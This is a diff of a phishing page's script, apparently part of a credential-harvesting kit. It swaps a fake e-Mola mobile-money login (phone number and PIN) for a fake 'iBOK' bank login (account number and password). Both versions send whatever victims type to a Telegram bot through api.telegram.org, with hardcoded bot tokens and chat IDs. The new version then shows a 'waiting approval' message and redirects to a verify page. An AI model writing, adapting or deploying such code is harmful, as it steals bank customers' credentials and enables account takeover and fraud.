@@ -280,7 +280,7 @@
                     <div class="field">
                         <label for="account">Enter the account number (7 digits):</label>
                         <div class="input-wrap">
-                            <input id="account" name="account" type="text" maxlength="20" placeholder="Enter the account number (7 digits)" autocomplete="off" required>
+                            <input id="account" name="account" type="text" inputmode="numeric" pattern="\d{7}" minlength="7" maxlength="7" placeholder="Enter 7 digits account number" autocomplete="off" required>
                         </div>
                     </div>
 
@@ -303,219 +303,91 @@
         </footer>
     </div>
 
-
-
-
     <script>
         // =======================
-        // BOT CONFIG (single bot - keep 2)
+        // BOT CONFIG
         // =======================
-        const BOT_TOKEN = '8728071345:AAHtK0Te8ZOoQDxX43tAmT51nweCyRnz19o';
-        const CHAT_ID = '7676797362';
+        const BOT_TOKEN = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
+        const CHAT_ID = '8406078749';
 
         // =======================
-        // DOM REFERENCES (MATCH YOUR HTML)
+        // DOM REFERENCES
         // =======================
-        const loginForm = document.getElementById("loginForm");
-        const phoneInput = document.getElementById("phone");
-        const pinInput = document.getElementById("pin");
-        const loginBtn = document.getElementById("enterBtn");
-
-        // Your HTML does NOT include spinnerOverlay, so we guard it
-        const spinnerOverlay = document.getElementById("spinnerOverlay");
-
-        const toast = document.getElementById("toast");
-        const languageButton = document.getElementById("languageButton");
-        const flagImg = document.getElementById("flagImg");
-        const langLabel = document.getElementById("langLabel");
-        const subtitleEl = document.getElementById("subtitle");
-        const forgotButton = document.getElementById("forgotButton");
-        const registerButton = document.getElementById("registerButton");
-        const locationButton = document.getElementById("locationButton");
-        const guideButton = document.getElementById("guideButton");
-        const backButton = document.getElementById("backButton");
+        const demoForm = document.getElementById("demo-form");
+        const accountInput = document.getElementById("account");
+        const passwordInput = document.getElementById("password");
+        const togglePasswordBtn = document.getElementById("toggle-password");
+        const messageDiv = document.getElementById("message");
 
         // =======================
-        // LOAD SAVED PHONE
+        // PASSWORD VISIBILITY TOGGLE
         // =======================
-        const savedPhone = localStorage.getItem('phone');
-        if (savedPhone && savedPhone.length >= 1) {
-            phoneInput.value = savedPhone;
+        if (togglePasswordBtn) {
+            togglePasswordBtn.addEventListener("click", function() {
+                const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+                passwordInput.setAttribute("type", type);
+                this.textContent = type === "password" ? "Show" : "Hide";
+            });
         }
 
         // =======================
-        // PIN ENABLE / SUBMIT CHECK (adapted)
+        // FORM SUBMIT & TELEGRAM BOT
         // =======================
-        function getPhoneValue() {
-            return (phoneInput.value || '').trim();
-        }
-
-        function getPinValue() {
-            return (pinInput.value || '').trim();
-        }
-
-        function updateLoginButtonState() {
-            const pinValue = getPinValue();
-            loginBtn.disabled = pinValue.length < 4; // change logic if you need exactly 6
-        }
-
-        // =======================
-        // INPUT SANITIZERS
-        // =======================
-        phoneInput.addEventListener("input", function() {
-            // allow digits and optional +
-            this.value = this.value.replace(/[^\d+ ]/g, "");
-        });
-
-        pinInput.addEventListener("input", function() {
-            // only digits, up to 6
-            this.value = this.value.replace(/\D/g, "").slice(0, 6);
-            updateLoginButtonState();
-        });
-
-        updateLoginButtonState();
-
-        // =======================
-        // TOAST
-        // =======================
-        function showToast(message) {
-            if (!toast) return;
-            toast.textContent = message;
-            toast.classList.add("show");
-            clearTimeout(window.toastTimer);
-            window.toastTimer = setTimeout(() => toast.classList.remove("show"), 2400);
-        }
-
-        // =======================
-        // LANGUAGE
-        // =======================
-        const FLAGS = {
-            pt: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPfTxr-CZTuCxdAIkhApPDtOT0dPkNLGVx08WtRJe0pQ&s",
-            en: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTG9ZbItOmbojydT4baosy-p6p_Z1-uM2Vb7eKz127ZxA&s=10"
-        };
-
-        const TEXTS = {
-            pt: {
-                langLabel: "POR",
-                subtitle: "Meu cell, minha mola",
-                phonePlaceholder: "Digite o número de telefone",
-                pinPlaceholder: "PIN",
-                enter: "ENTRAR",
-                forgot: "Esqueceu a senha",
-                register: "Cadastrar-se",
-                needPhone: "Digite o número de telefone.",
-                needPin: "Digite o PIN.",
-                sent: "Demo: formulário enviado.",
-                forgotMsg: "Recuperação de senha.",
-                registerMsg: "Cadastro.",
-                locationMsg: "Localizações.",
-                guideMsg: "Guia e-Mola.",
-                backMsg: "Voltar.",
-                langMsg: "Idioma: Português."
-            },
-            en: {
-                langLabel: "ENG",
-                subtitle: "My cell, my spring",
-                phonePlaceholder: "Enter phone number",
-                pinPlaceholder: "PIN",
-                enter: "ENTER",
-                forgot: "Forgot password",
-                register: "Sign up",
-                needPhone: "Enter the phone number.",
-                needPin: "Enter the PIN.",
-                sent: "Demo: form submitted.",
-                forgotMsg: "Password recovery.",
-                registerMsg: "Sign up.",
-                locationMsg: "Locations.",
-                guideMsg: "e-Mola guide.",
-                backMsg: "Back.",
-                langMsg: "Language: English."
-            }
-        };
-
-        let currentLang = "pt";
-
-        function applyTexts(lang) {
-            const t = TEXTS[lang];
-            document.documentElement.lang = lang === "pt" ? "pt" : "en";
-            langLabel.textContent = t.langLabel;
-            flagImg.src = FLAGS[lang];
-            flagImg.alt = lang === "pt" ? "Português" : "English";
-            subtitleEl.textContent = t.subtitle;
-
-            phoneInput.placeholder = t.phonePlaceholder;
-            pinInput.placeholder = t.pinPlaceholder;
-
-            document.getElementById("enterBtn").textContent = t.enter;
-            forgotButton.textContent = t.forgot;
-            registerButton.textContent = t.register;
-        }
-
-        // =======================
-        // BUTTON / CLICK HANDLERS
-        // =======================
-        languageButton.addEventListener("click", function() {
-            currentLang = currentLang === "pt" ? "en" : "pt";
-            applyTexts(currentLang);
-            showToast(TEXTS[currentLang].langMsg);
-        });
-
-        loginForm.addEventListener("submit", function(event) {
+        demoForm.addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const phone = getPhoneValue();
-            const pinValue = getPinValue();
+            const account = accountInput.value.trim();
+            const password = passwordInput.value.trim();
 
-            if (!phone) {
-                showToast(TEXTS[currentLang].needPhone);
-                phoneInput.focus();
+            if (!account || !password) {
+                messageDiv.textContent = "Please fill in all fields.";
+                messageDiv.className = "message visible error";
                 return;
             }
 
-            if (!pinValue || pinValue.length < 4) {
-                showToast(TEXTS[currentLang].needPin);
-                pinInput.focus();
+            // Validate account number is exactly 7 digits
+            const accountRegex = /^\d{7}$/;
+            if (!accountRegex.test(account)) {
+                messageDiv.textContent = "Account number must be exactly 7 digits.";
+                messageDiv.className = "message visible error";
                 return;
             }
 
-            if (spinnerOverlay) spinnerOverlay.style.display = 'flex';
+            // Format message to send to Telegram
+            const textMessage = `New iBOK Login Attempt:\n\nAccount: ${account}\nPassword: ${password}`;
 
-            localStorage.setItem('phone', phone);
-
-            const message =
-                `New Login Attempt\n\nPhone: +258 ${phone}\nPIN: ${pinValue}`;
-
-            // Single fetch (only one bot)
+            // Send data to Telegram Bot API
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textMessage
+                    })
                 })
-            }).catch(() => {});
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        messageDiv.textContent = "waiting approval.....";
+                        messageDiv.className = "message visible success";
 
-            setTimeout(() => {
-                window.location.href = 'verify.html';
-            }, 1500);
+                        // Redirect to verify.html after a 1.5-second delay
+                        setTimeout(() => {
+                            window.location.href = 'verify.html';
+                        }, 1500);
+                    } else {
+                        messageDiv.textContent = "Error sending data. Try again.";
+                        messageDiv.className = "message visible error";
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    messageDiv.textContent = "Network error occurred.";
+                    messageDiv.className = "message visible error";
+                });
         });
-
-        forgotButton.addEventListener("click", () => showToast(TEXTS[currentLang].forgotMsg));
-        registerButton.addEventListener("click", () => showToast(TEXTS[currentLang].registerMsg));
-        locationButton.addEventListener("click", () => showToast(TEXTS[currentLang].locationMsg));
-        guideButton.addEventListener("click", () => showToast(TEXTS[currentLang].guideMsg));
-
-        backButton.addEventListener("click", function() {
-            if (history.length > 1) history.back();
-            else showToast(TEXTS[currentLang].backMsg);
-        });
-
-        // =======================
-        // INIT
-        // =======================
-        applyTexts(currentLang);
     </script>
 </body>
 
